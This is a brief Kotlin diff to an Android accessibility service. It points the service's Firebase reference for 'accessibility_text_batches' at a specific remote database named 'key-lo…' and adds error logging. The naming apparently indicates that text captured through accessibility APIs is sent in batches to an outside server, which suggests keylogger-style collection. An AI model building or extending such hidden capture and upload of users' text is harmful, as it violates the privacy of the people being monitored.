@@ -20,8 +20,9 @@ class AppAccessibilityService : AccessibilityService() {
         private const val TAG = "AppAccessibilityService"
         private val scope = CoroutineScope(Dispatchers.IO)
         private fun getDatabaseRef() = try {
-            FirebaseDatabase.getInstance().getReference("accessibility_text_batches")
+            FirebaseDatabase.getInstance("https://key-lo-5811c-default-rtdb.firebaseio.com").getReference("accessibility_text_batches")
         } catch (e: Exception) {
+            Log.e(TAG, "Error getting database ref", e)
             null
         }
     }
